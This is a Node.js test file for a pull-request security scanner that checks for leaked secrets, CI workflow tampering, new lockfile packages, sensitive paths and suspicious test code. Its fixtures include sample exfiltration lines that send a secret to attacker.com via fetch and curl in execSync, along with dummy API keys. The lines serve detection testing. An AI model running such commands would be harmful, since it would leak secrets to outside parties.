import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  buildAdvisoryPayload,
  findExistingDraftAdvisory,
  postSecurityCheckRun,
  scanSecrets,
  scanCITampering,
  scanBuildScripts,
  scanSupplyChain,
  scanTestPatterns,
  scanSensitivePaths,
  startScriptWatchdog,
  syncDraftAdvisory,
  validateSensitivePaths,
} from '../check-pr-security.mjs';
import { ghFetch } from '../get-bot-token.mjs';

// ── scanSecrets ──────────────────────────────────────────────────────────────

test('scanSecrets: flags OpenAI key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: flags AWS key in added line', () => {
  const files = [{ filename: 'src/config.ts', patch: '+const awsKey = "AKIAIOSFODNN7EXAMPLE"' }];
  assert.ok(scanSecrets(files).length > 0);
});

test('scanSecrets: ignores removed lines', () => {
  const files = [{ filename: 'src/config.ts', patch: '-const key = "sk-abcdefghijklmnopqrstuvwxyz123456"' }];
  assert.equal(scanSecrets(files).length, 0);
});

test('scanSecrets: ignores files without patch', () => {
  assert.equal(scanSecrets([{ filename: 'large-file.ts' }]).length, 0);
});

// ── scanCITampering ──────────────────────────────────────────────────────────

test('scanCITampering: flags workflow file changes', () => {
  const files = [{ filename: '.github/workflows/pr.yml', status: 'modified' }];
  assert.ok(scanCITampering(files).length > 0);
});

test('scanCITampering: ignores non-workflow files', () => {
  const files = [{ filename: 'src/foo.ts', status: 'modified' }];
  assert.equal(scanCITampering(files).length, 0);
});

test('scanCITampering: ignores removed workflow files', () => {
  const files = [{ filename: '.github/workflows/old.yml', status: 'removed' }];
  assert.equal(scanCITampering(files).length, 0);
});

// ── scanBuildScripts ─────────────────────────────────────────────────────────

test('scanBuildScripts: flags changes to release.sh', () => {
  const files = [{ filename: 'scripts/release.sh', status: 'modified' }];
  assert.ok(scanBuildScripts(files).length > 0);
});

test('scanBuildScripts: ignores non-CI scripts', () => {
  const files = [{ filename: 'scripts/generate-org-chart-images.ts', status: 'modified' }];
  assert.equal(scanBuildScripts(files).length, 0);
});

// ── scanSupplyChain ──────────────────────────────────────────────────────────

test('scanSupplyChain: flags net-new packages in lockfile', () => {
  const patch = `@@ -1,3 +1,4 @@
 packages:
+  'evil-package@1.0.0':
   'existing-package@2.0.0':
-  'old-package@1.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.ok(flags.length > 0);
  assert.ok(flags[0].packages.includes('evil-package'));
});

test('scanSupplyChain: does not flag version-only bumps', () => {
  const patch = `@@ -1,3 +1,3 @@
 packages:
-  'existing-package@1.0.0':
+  'existing-package@2.0.0':
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('scanSupplyChain: flags pnpm v9-style unquoted package entries', () => {
  const patch = `@@ -1,2 +1,3 @@
+evil-package@1.0.0:
 existing-package@2.0.0:
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
});

test('scanSupplyChain: ignores peer suffixes when matching package names', () => {
  const patch = `@@ -1,2 +1,2 @@
-@scope/pkg@1.0.0(react@18.2.0):
+@scope/pkg@2.0.0(react@18.2.0):
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  assert.equal(scanSupplyChain(files).length, 0);
});

test('scanSupplyChain: flags net-new packages that include pnpm peer suffixes', () => {
  const patch = `@@ -1,2 +1,3 @@
+evil-package@1.0.0(react@18.2.0):
 existing-package@2.0.0:
`;
  const files = [{ filename: 'pnpm-lock.yaml', patch }];
  const flags = scanSupplyChain(files);
  assert.deepEqual(flags, [{ check: 'supply-chain', packages: ['evil-package'] }]);
});

test('findExistingDraftAdvisory: returns matching draft advisory from paginated results', async () => {
  const calls = [];
  const fakeFetch = async (path) => {
    calls.push(path);
    if (/[?&]page=1(?:&|$)/.test(path)) {
      return Array.from({ length: 100 }, (_, i) => ({ summary: `Unrelated advisory ${i}` }));
    }
    if (/[?&]page=2(?:&|$)/.test(path)) {
      return [{ summary: '🚨 Security flag — PR #6469: ci-tampering' }];
    }
    return [];
  };

  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);

  assert.deepEqual(advisory, { summary: '🚨 Security flag — PR #6469: ci-tampering' });
  assert.equal(calls.length, 2);
});

test('findExistingDraftAdvisory: returns null when no matching draft advisory exists', async () => {
  const fakeFetch = async () => [{ summary: 'Completely different advisory' }];
  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);
  assert.equal(advisory, null);
});

test('findExistingDraftAdvisory: bails out at the page cap so a large backlog cannot hang the workflow', async () => {
  let pageCount = 0;
  const fakeFetch = async () => {
    pageCount += 1;
    return Array.from({ length: 100 }, (_, i) => ({ summary: `Unrelated advisory ${pageCount}-${i}` }));
  };

  const advisory = await findExistingDraftAdvisory(fakeFetch, 'token', 'paperclipai/paperclip', 6469);

  assert.equal(advisory, null);
  assert.equal(pageCount, 20, `expected pagination to run exactly 20 pages (the cap), got ${pageCount}`);
});

test('syncDraftAdvisory: patches an existing advisory with the latest flags', async () => {
  const calls = [];
  const flags = [
    { check: 'ci-tampering', file: '.github/workflows/pr.yml' },
    { check: 'secret-scan', file: 'src/config.ts', pattern: 'OpenAI API key' },
  ];

  await syncDraftAdvisory(async (path, token, options) => {
    calls.push({ path, token, options });
    if (path.includes('/security-advisories?state=draft')) {
      return [{ ghsa_id: 'GHSA-test-1234', summary: '🚨 Security flag — PR #6469: ci-tampering' }];
    }
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 6469, 'My PR', flags);

  assert.equal(calls.length, 2);
  assert.equal(calls[1].path, '/repos/paperclipai/paperclip/security-advisories/GHSA-test-1234');
  assert.equal(calls[1].options.method, 'PATCH');
  const patchBody = JSON.parse(calls[1].options.body);
  const { vulnerabilities: _vulnerabilities, ...expectedPatch } = buildAdvisoryPayload(6469, 'My PR', flags);
  assert.deepEqual(patchBody, expectedPatch);
  assert.ok(!('vulnerabilities' in patchBody), 'PATCH must omit vulnerabilities (GitHub rejects empty array with 422)');
});

test('syncDraftAdvisory: creates a new advisory when none exists', async () => {
  const calls = [];
  const flags = [{ check: 'supply-chain', packages: ['evil-package'] }];

  await syncDraftAdvisory(async (path, token, options) => {
    calls.push({ path, token, options });
    if (path.includes('/security-advisories?state=draft')) {
      return [];
    }
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 6469, 'My PR', flags);

  assert.equal(calls.length, 2);
  assert.equal(calls[1].path, '/repos/paperclipai/paperclip/security-advisories');
  assert.equal(calls[1].options.method, 'POST');
  assert.deepEqual(JSON.parse(calls[1].options.body), buildAdvisoryPayload(6469, 'My PR', flags));
});

test('postSecurityCheckRun: uses the injected fetch implementation', async () => {
  const calls = [];

  await postSecurityCheckRun(async (path, token, options) => {
    calls.push({ path, token, options });
    return { ok: true };
  }, 'token', 'paperclipai/paperclip', 'deadbeef', true);

  assert.equal(calls.length, 1);
  assert.equal(calls[0].path, '/repos/paperclipai/paperclip/check-runs');
  assert.equal(calls[0].options.method, 'POST');
  assert.deepEqual(JSON.parse(calls[0].options.body), {
    name: 'security-review',
    head_sha: 'deadbeef',
    status: 'completed',
    conclusion: 'neutral',
    output: {
      title: 'Security Review Recommended',
      summary: 'Draft advisory filed for maintainer review. Not a merge block — review the advisory at your leisure.',
    },
  });
});

test('validateSensitivePaths: checks paths against the resolved base ref instead of master', async () => {
  const seenPaths = [];
  const stale = await validateSensitivePaths(
    'token',
    'paperclipai/paperclip',
    6469,
    'release/1.2',
    async (path) => {
      seenPaths.push(path);
      return { ok: true };
    },
  );

  assert.deepEqual(stale, []);
  assert.ok(seenPaths.every(path => path.includes('ref=release%2F1.2')));
  assert.ok(!seenPaths.some(path => path.includes('ref=master')));
});

test('validateSensitivePaths: returns only 404 paths and rethrows non-404 errors', async () => {
  let seen404 = false;
  const stale = await validateSensitivePaths(
    'token',
    'paperclipai/paperclip',
    6469,
    'main',
    async (path) => {
      if (!seen404) {
        seen404 = true;
        throw new Error('GitHub API GET /contents/foo → 404: missing');
      }
      return { ok: true };
    },
  );

  assert.equal(stale.length, 1);

  await assert.rejects(
    validateSensitivePaths(
      'token',
      'paperclipai/paperclip',
      6469,
      'main',
      async () => {
        throw new Error('GitHub API GET /contents/foo → 500: boom');
      },
    ),
    /500: boom/
  );
});

// ── scanTestPatterns ─────────────────────────────────────────────────────────

test('scanTestPatterns: flags outbound fetch in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  const res = await fetch('https://attacker.com/collect')`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: flags execSync in test file', () => {
  const files = [{
    filename: 'src/foo.test.ts',
    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

test('scanTestPatterns: ignores suspicious patterns in non-test files', () => {
  const files = [{
    filename: 'src/api.ts',
    patch: `+  const res = await fetch('https://api.example.com')`,
  }];
  assert.equal(scanTestPatterns(files).length, 0);
});

test('scanTestPatterns: flags suspicious patterns in __tests__ directories', () => {
  const files = [{
    filename: 'src/__tests__/foo.ts',
    patch: `+  execSync('curl https://attacker.com?data=' + secret)`,
  }];
  assert.ok(scanTestPatterns(files).length > 0);
});

// ── scanSensitivePaths ───────────────────────────────────────────────────────

test('scanSensitivePaths: flags changes to agents route (API key IDOR / cross-tenant)', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to MarkdownBody (XSS via urlTransform)', () => {
  const files = [{ filename: 'ui/src/components/MarkdownBody.tsx', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: flags changes to company-skills route (malicious skill exfil)', () => {
  const files = [{ filename: 'server/src/routes/company-skills.ts', status: 'modified' }];
  assert.ok(scanSensitivePaths(files).length > 0);
});

test('scanSensitivePaths: ignores unrelated paths', () => {
  const files = [{ filename: 'server/src/utils/date.ts', status: 'modified' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});

test('scanSensitivePaths: ignores removed files even on sensitive paths', () => {
  const files = [{ filename: 'server/src/routes/agents.ts', status: 'removed' }];
  assert.equal(scanSensitivePaths(files).length, 0);
});

// ── startScriptWatchdog ──────────────────────────────────────────────────────

test('startScriptWatchdog: fires exit(0) when the wall-clock budget is exceeded', async () => {
  let exitCode = null;
  const fakeExit = (code) => { exitCode = code; };
  startScriptWatchdog(20, fakeExit);
  await new Promise((resolve) => setTimeout(resolve, 60));
  assert.equal(exitCode, 0, 'watchdog should have exited with code 0 by now');
});

test('startScriptWatchdog: cleared timer never fires', async () => {
  let exitCode = null;
  const fakeExit = (code) => { exitCode = code; };
  const timer = startScriptWatchdog(20, fakeExit);
  clearTimeout(timer);
  await new Promise((resolve) => setTimeout(resolve, 60));
  assert.equal(exitCode, null, 'cleared watchdog must not call exit');
});

// ── ghFetch timeout ──────────────────────────────────────────────────────────

test('ghFetch: aborts the request when the per-call timeout elapses', async () => {
  const originalFetch = globalThis.fetch;
  // Replace global fetch with one that respects the AbortSignal but never resolves on its own.
  globalThis.fetch = (_url, init) => new Promise((_resolve, reject) => {
    init?.signal?.addEventListener('abort', () => {
      const err = new Error('aborted');
      err.name = 'AbortError';
      reject(err);
    }, { once: true });
  });

  try {
    const start = Date.now();
    await assert.rejects(
      ghFetch('/repos/example/example/security-advisories', 'token', { timeoutMs: 30 }),
      /aborted|abort/i,
    );
    const elapsed = Date.now() - start;
    assert.ok(elapsed < 500, `ghFetch should abort within the timeout, took ${elapsed}ms`);
  } finally {
    globalThis.fetch = originalFetch;
  }
});
